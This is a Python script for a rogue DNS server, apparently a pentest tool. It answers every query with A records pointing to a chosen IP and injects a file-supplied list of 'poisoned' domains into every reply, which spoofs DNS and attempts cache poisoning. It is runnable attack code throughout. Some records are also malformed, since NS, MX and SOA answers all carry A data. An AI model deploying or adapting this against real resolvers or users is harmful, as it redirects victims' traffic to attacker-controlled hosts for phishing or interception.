import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct

from dnslib import SOA, NS, A, AAAA, MX, CNAME, DNSRecord, DNSHeader, QTYPE, RR


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + "." + self)


D = DomainName("example.com.")
IP = "127.0.0.1"
TTL = 604800

poisoned_domains = []

soa_record = SOA(
    mname=D.ns1,
    rname=D.pentest,
    times=(
        201307231,  # serial number
        60 * 60 * 1,  # refresh
        60 * 60 * 3,  # retry
        60 * 60 * 24,  # expire
        60 * 60 * 1,  # minimum
    ),
)
ns_records = [NS(D.ns1), NS(D.ns2)]
records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [
        A(IP)
    ],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
    D.ns2: [A(IP)],
    D.mail: [A(IP)],
    D.andrei: [CNAME(D)],
    D.any: [A(IP)],
}


def dns_response(data):
    request = DNSRecord.parse(data)

    print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    # Return the same answer for any queries
    if qn:
        for name, rrs in records.items():
            # Disable checking to return the same answer for any queries
            if name:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if False:
                        pass
                    else:
                        reply.add_answer(
                            RR(
                                rname=qname,
                                rtype=getattr(QTYPE, rqt),
                                rclass=1,
                                ttl=TTL,
                                rdata=A(IP),
                            )
                        )

        # Add poisoned domains
        for domain in poisoned_domains:
            reply.add_answer(RR(domain.strip(), ttl=TTL, rdata=A(IP)))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(
            RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record)
        )

    print("---- Reply:\n", reply)

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
        print(
            "\n\n%s request %s (%s %s):"
            % (
                self.__class__.__name__[:3],
                now,
                self.client_address[0],
                self.client_address[1],
            )
        )
        try:
            data = self.get_data()
            print(len(data), data)
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack(">H", data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack(">H", len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description="Start a DNS implemented in Python.")
    parser = argparse.ArgumentParser(
        description="Start a DNS implemented in Python. Usually DNSs use UDP on port 53."
    )
    parser.add_argument("--port", default=5053, type=int, help="The port to listen on.")
    parser.add_argument("--tcp", action="store_true", help="Listen to TCP connections.")
    parser.add_argument("--udp", action="store_true", help="Listen to UDP datagrams.")
    parser.add_argument("--file", default="bigdns.txt", type=str, help="Domain files")
    parser.add_argument(
        "--ip", default="127.0.0.1", type=str, help="IP address to add into A record"
    )

    args = parser.parse_args()
    if not (args.udp or args.tcp):
        parser.error("Please select at least one of --udp or --tcp.")

    # Update IP variable with the one obtained from the argument
    global IP
    IP = args.ip
    # Update poisoned domains list
    global poisoned_domains
    with open(args.file) as file:
        poisoned_domains = file.readlines()

    print("Starting nameserver...")

    servers = []
    if args.udp:
        servers.append(
            socketserver.ThreadingUDPServer(("", args.port), UDPRequestHandler)
        )
    if args.tcp:
        servers.append(
            socketserver.ThreadingTCPServer(("", args.port), TCPRequestHandler)
        )

    for s in servers:
        thread = threading.Thread(
            target=s.serve_forever
        )  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print(
            "%s server loop running in thread: %s"
            % (s.RequestHandlerClass.__name__[:3], thread.name)
        )

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()


if __name__ == "__main__":
    main()
